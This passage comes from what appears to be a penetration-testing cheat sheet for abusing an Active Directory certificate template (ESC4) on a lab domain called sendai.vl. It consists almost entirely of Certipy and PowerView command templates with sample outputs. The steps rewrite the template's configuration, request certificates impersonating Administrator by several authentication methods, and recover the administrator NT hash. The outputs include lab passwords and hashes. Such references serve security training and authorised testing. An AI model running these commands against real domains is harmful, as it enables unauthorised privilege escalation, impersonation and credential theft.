</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad template -u <span class="s1">'clifford.davey@sendai.vl'</span> -k -target dc.sendai.vl -dc-ip 10.129.234.66 -dc-host dc.sendai.vl -ns 10.129.234.66 -template <span class="s1">'SendaiComputer'</span> -write-default-configuration -no-save
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] KRB5CCNAME environment variable not set
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Updating certificate template 'SendaiComputer'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Replacing:
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     flags: 66104
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIDefaultKeySpec: 2
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIKeyUsage: b'\x86\x00'
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIMaxIssuingDepth: -1
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Enrollment-Flag: 0
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Private-Key-Flag: 16
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Certificate-Name-Flag: 1
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Minimal-Key-Size: 2048
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
</span></span></span><span class="line"><span class="cl"><span class="go">Are you sure you want to apply these changes to 'SendaiComputer'? (y/N): y
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully updated 'SendaiComputer'
</span></span></span></div></pre></div><h4 id="2-request-a-certificate-using-the-modified-template">2. Request a Certificate Using the Modified Template</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -upn <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'clifford.davey'</span> -p <span class="s1">'RFmoB2WplgE_3p'</span> -target dc.sendai.vl -upn Administrator@sendai.vl -ca sendai-DC-CA -template SendaiComputer
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] DNS resolution failed: The DNS query name does not exist: dc.sendai.vl.
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Use -debug to print a stacktrace
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 9
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'Administrator@sendai.vl'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate has no object SID
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Try using -sid to set the object SID or see the wiki for more details
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
</span></span></span></div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -upn <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'clifford.davey'</span> -hashes <span class="s1">'13cee2652d9af0b63e3ebda229edf2ed'</span> -target dc.sendai.vl -upn Administrator@sendai.vl -ca sendai-DC-CA -template SendaiComputer
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] DNS resolution failed: The DNS query name does not exist: dc.sendai.vl.
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Use -debug to print a stacktrace
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 10
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'Administrator@sendai.vl'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate has no object SID
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Try using -sid to set the object SID or see the wiki for more details
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
</span></span></span></div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -upn <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'clifford.davey@sendai.vl'</span> -p <span class="s1">'RFmoB2WplgE_3p'</span> -k -target dc.sendai.vl -dc-host dc.sendai.vl -ns 10.129.234.66 -upn Administrator@sendai.vl -ca sendai-DC-CA -template SendaiComputer
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] KRB5CCNAME environment variable not set
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 11
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'Administrator@sendai.vl'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate has no object SID
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Try using -sid to set the object SID or see the wiki for more details
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
</span></span></span></div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -upn <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'clifford.davey@sendai.vl'</span> -hashes <span class="s1">'13cee2652d9af0b63e3ebda229edf2ed'</span> -k -target dc.sendai.vl -dc-host dc.sendai.vl -ns 10.129.234.66 -upn Administrator@sendai.vl -ca sendai-DC-CA -template SendaiComputer
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] KRB5CCNAME environment variable not set
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 12
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'Administrator@sendai.vl'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate has no object SID
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Try using -sid to set the object SID or see the wiki for more details
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
</span></span></span></div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -upn <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'clifford.davey@sendai.vl'</span> -k -target dc.sendai.vl -dc-host dc.sendai.vl -ns 10.129.234.66 -upn Administrator@sendai.vl -ca sendai-DC-CA -template SendaiComputer
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 13
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'Administrator@sendai.vl'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate has no object SID
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Try using -sid to set the object SID or see the wiki for more details
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
</span></span></span></div></pre></div><h4 id="3-get-ntlm-hash">3. Get NTLM Hash</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad auth -pfx <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>.pfx -domain <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad auth -pfx administrator.pfx -domain sendai.vl -dc-ip 10.129.234.66
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Certificate identities:
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     SAN UPN: 'administrator@sendai.vl'
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     SAN URL SID: 'S-1-5-21-3085872742-570972823-736764132-500'
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     Security Extension SID: 'S-1-5-21-3085872742-570972823-736764132-500'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using principal: 'administrator@sendai.vl'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to get TGT...
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got TGT
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving credential cache to 'administrator.ccache'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote credential cache to 'administrator.ccache'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to retrieve NT hash for 'administrator'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got hash for 'administrator@sendai.vl': aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a
</span></span></span></div></pre></div></div><div class="tabcontent" data-tabset="set9" data-tabcontent="tab2"><h4 id="1-import-module">1. Import Module</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">evil-winrm-py PS C:\Users\Clifford.Davey\Documents&gt; . .\PowerView.ps1
</span></span></span></div></pre></div><h4 id="2-modify-template-to-a-vulnerable-state">2. Modify Template to a Vulnerable State</h4>
<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainObjectAcl -TargetIdentity <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span> -PrincipalIdentity "Domain Users" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=<span class="o editable-keyword">&lt;EXAMPLE&gt;</span>,DC=<span class="o editable-keyword">&lt;COM&gt;</span>"
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">evil-winrm-py PS C:\Users\Clifford.Davey\Documents&gt; Add-DomainObjectAcl -TargetIdentity SendaiComputer -PrincipalIdentity "Domain Users" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP:
</span></span></span><span class="line"><span class="cl"><span class="go">//CN=Configuration,DC=sendai,DC=vl"
</span></span></span></div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<span class="o editable-keyword">&lt;EXAMPLE&gt;</span>,DC=<span class="o editable-keyword">&lt;COM&gt;</span>" -Identity <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span> -XOR @{'mspki-certificate-name-flag'=1} -Verbose
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">evil-winrm-py PS C:\Users\Clifford.Davey\Documents&gt; Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=sendai,DC=vl" -Identity SendaiComputer -XOR @{'msp
</span></span></span><span class="line"><span class="cl"><span class="go">ki-certificate-name-flag'=1} -Verbose
</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<span class="o editable-keyword">&lt;EXAMPLE&gt;</span>,DC=<span class="o editable-keyword">&lt;COM&gt;</span>" -Identity <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span> -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">evil-winrm-py PS C:\Users\Clifford.Davey\Documents&gt; Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=sendai,DC=vl" -Identity SendaiComputer -Set @{'msp
</span></span></span><span class="line"><span class="cl"><span class="go">ki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
</span></span></span></div></pre></div><h4 id="3-request-a-certificate-using-the-modified-template">3. Request a Certificate Using the Modified Template</h4>
